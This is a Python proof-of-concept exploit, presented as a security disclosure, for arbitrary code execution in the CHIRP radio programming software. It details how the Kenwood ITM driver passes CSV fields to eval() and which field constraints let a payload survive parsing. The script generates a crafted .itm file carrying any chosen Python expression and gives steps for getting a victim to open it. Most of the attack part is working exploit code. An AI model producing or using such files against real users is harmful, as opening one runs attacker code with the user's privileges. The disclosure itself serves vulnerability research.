"""
CHIRP - Arbitrary Code Execution via eval() on .itm CSV fields
===============================================================

CHIRP's Kenwood ITM driver passes raw CSV cells (TXSIG/RXSIG) from an opened
.itm file directly to Python's eval(). Driver selection is by filename
extension alone, and CSVRadio.__init__ auto-calls load() on construction, so
opening a crafted .itm file executes arbitrary Python with the user's
privileges.

Affected: CHIRP chirp-next-20260814 (commit cb7d5e2); code unchanged since 2012
CWE:      CWE-94 (Improper Control of Generation of Code)
CVSS:     7.8 (CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)

Vulnerable chain
----------------
  chirp/wxui/main.py:582        File->Open -> directory.get_radio_by_image()
  chirp/directory.py:180-192    iterates ALL registered drivers (DRV_TO_RADIO)
  chirp/drivers/kenwood_itm.py:135-137
                                match_model() -> filename.endswith(".itm")
                                (extension ONLY -- no content validation)
  chirp/drivers/generic_csv.py:110-111
                                CSVRadio.__init__ -> self.load() on construction
  chirp/drivers/kenwood_itm.py:79-128
                                load() -> _parse_csv_data_line()
  chirp/drivers/generic_csv.py:143-154
                                _clean() reflectively dispatches _clean_<attr>
  chirp/drivers/kenwood_itm.py:65-67
                                _clean_tmode() -> eval(TXSIG) / eval(RXSIG)  <-- SINK

Why the payload survives parsing
--------------------------------
  * No commas: kenwood_itm.py:115 rewrites ',' -> '.' (EU decimal fixup).
  * Single quotes only: csv quotechar is '"', so ' is not special.
  * CH/ZN must be valid ints and RXF a valid frequency, otherwise
    _parse_csv_data_line()/_clean_number() raise first and the row is
    skipped before reaching the sink.
  * _clean() dispatches alphabetically (duplex -> number -> tmode), so the
    earlier handlers must not throw.
  * RXSIG is eval'd immediately after TXSIG, so it must also be a valid
    expression (we use 0).

Usage
-----
    python poc_...py                  # write evil.itm (default payload: calc)
    python poc_...py --selftest       # verify payload survives parsing (SAFE,
                                      #   never calls eval, no file needed)
    python poc_...py --payload "..."  # custom Python expression
    python poc_...py --output PATH    # custom output path

Then in CHIRP:  File -> Open -> set filter to "All Files (*.*)" -> pick the file.
(ITM is registered as a driver but never calls register_format(), so it is not
offered in the dropdown filter -- hence the "All Files" step.)

DISCLAIMER: For authorized security research only. Run against systems you own.
"""
import argparse
import csv
import io
import os
import sys

TARGET_PRODUCT = "CHIRP"
TARGET_VERSION = "chirp-next-20260814 (commit cb7d5e2)"
CWE = "CWE-94"

# Literal marker kenwood_itm.load() scans for before CSV parsing begins.
MARKER = "// Conventional Data"

# Columns consumed by the ITM driver:
#   CH    -> int(),        via ATTR_MAP        (must parse or row is skipped)
#   ZN    -> int(),        via _clean_number   (must parse or row is skipped)
#   RXF   -> parse_freq(), via ATTR_MAP        (must parse or row is skipped)
#   TXF   -> parse_freq(), via _clean_duplex   (ValueError is caught -> safe)
#   NAME  -> str()
#   TXSIG -> eval()  <-- SINK
#   RXSIG -> eval()  <-- SINK (evaluated right after TXSIG)
HEADER = ["CH", "ZN", "RXF", "TXF", "NAME", "TXSIG", "RXSIG"]

DEFAULT_PAYLOAD = "__import__('os').system('calc')"
DEFAULT_OUTPUT = "evil.itm"


def build_itm(payload):
    """Build the .itm file contents carrying `payload` in the TXSIG cell."""
    row = [
        "1",             # CH    - valid int
        "1",             # ZN    - valid int
        "146.520000",    # RXF   - valid frequency (2m calling, harmless)
        "146.520000",    # TXF   - valid frequency
        "PoC",           # NAME
        payload,         # TXSIG - reaches eval()
        "0",             # RXSIG - reaches eval(); benign, must be valid expr
    ]
    return (
        "// CHIRP ITM proof-of-concept\n"
        "// Demonstrates CWE-94 via eval() in kenwood_itm._clean_tmode\n"
        f"{MARKER}\n"
        f"{','.join(HEADER)}\n"
        f"{','.join(row)}\n"
    )


def _get_datum_by_header(headers, line, name):
    """Mirror of generic_csv.get_datum_by_header() for the self-test."""
    return line[headers.index(name)]


def selftest(payload):
    """Replicate CHIRP's parse path and show what reaches eval() -- WITHOUT
    calling eval. Proves the payload survives CSV parsing intact."""
    print("[*] Self-test: simulating CHIRP's ITM parse path (eval NOT called)")
    print()

    content = build_itm(payload)

    # 1. load() discards lines until the marker, then csv-parses the rest.
    f = io.StringIO(content)
    for line in f:
        if line.strip() == MARKER:
            break
    else:
        print("[-] FAIL: marker line never found")
        return False

    # 2. csv.reader with chirp_common.SEPCHAR (',') and quotechar '"'.
    reader = csv.reader(f, delimiter=",", quotechar='"')
    rows = [r for r in reader if r]
    if len(rows) < 2:
        print("[-] FAIL: expected a header row and >=1 data row")
        return False

    header, data = rows[0], rows[1]

    # 3. kenwood_itm.py:107 - header must not be longer than the data row.
    if len(header) > len(data):
        print("[-] FAIL: column count mismatch (row would be skipped)")
        return False

    # 4. kenwood_itm.py:115 - EU decimal fixup rewrites ',' -> '.'.
    data = [i.replace(",", ".") for i in data]

    # 5. Fields that must parse, or the row is skipped before the sink.
    try:
        int(_get_datum_by_header(header, data, "CH"))
        int(_get_datum_by_header(header, data, "ZN"))
    except ValueError as e:
        print(f"[-] FAIL: CH/ZN not parseable as int ({e}) -- row skipped")
        return False

    # 6. What _clean_tmode() would hand to eval().
    txsig = _get_datum_by_header(header, data, "TXSIG")
    rxsig = _get_datum_by_header(header, data, "RXSIG")

    print(f"    eval() would receive (TXSIG): {txsig!r}")
    print(f"    eval() would receive (RXSIG): {rxsig!r}")
    print()

    if txsig != payload:
        print("[-] FAIL: payload was mangled by CSV parsing")
        print(f"    sent:     {payload!r}")
        print(f"    received: {txsig!r}")
        return False

    # 7. Syntax-check only -- compile() in 'eval' mode never executes.
    try:
        compile(txsig, "<txsig>", "eval")
    except SyntaxError as e:
        print(f"[-] FAIL: payload is not a valid Python expression: {e}")
        return False

    print("[+] Payload survives parsing intact and is a valid expression.")
    print("[+] CHIRP would execute it at kenwood_itm.py:66.")
    return True


def run_poc(payload, output):
    print(f"[*] {TARGET_PRODUCT} {TARGET_VERSION}")
    print(f"[*] {CWE} - arbitrary code execution via eval() in the ITM driver")
    print()

    content = build_itm(payload)
    with open(output, "w", newline="") as fh:
        fh.write(content)

    path = os.path.abspath(output)
    print(f"[+] Wrote {path}")
    print()
    print("    File contents:")
    for line in content.rstrip("\n").split("\n"):
        print(f"      {line}")
    print()
    print(f"[*] Payload placed in TXSIG: {payload}")
    print()
    print("[*] To test in CHIRP:")
    print("      1. Launch CHIRP")
    print("      2. File -> Open")
    print('      3. Change the filter dropdown to "All Files (*.*)"')
    print(f"      4. Select {os.path.basename(output)}")
    print()
    print("    Expected: calc.exe launches -> arbitrary code execution confirmed.")
    print("    CHIRP may then show an empty/errored radio tab; that is harmless,")
    print("    just close it. The payload already ran during parsing.")
    print()
    print("[!] This POC only WRITES a file. It executes nothing itself.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CHIRP .itm eval() code-execution PoC (CWE-94)")
    parser.add_argument("--selftest", action="store_true",
                        help="verify the payload survives parsing; never "
                             "calls eval, writes no file")
    parser.add_argument("--payload", default=DEFAULT_PAYLOAD,
                        help="Python expression to place in the TXSIG cell "
                             f"(default: {DEFAULT_PAYLOAD})")
    parser.add_argument("--output", default=DEFAULT_OUTPUT,
                        help=f"output path (default: {DEFAULT_OUTPUT})")
    args = parser.parse_args()

    if args.selftest:
        sys.exit(0 if selftest(args.payload) else 1)
    run_poc(args.payload, args.output)
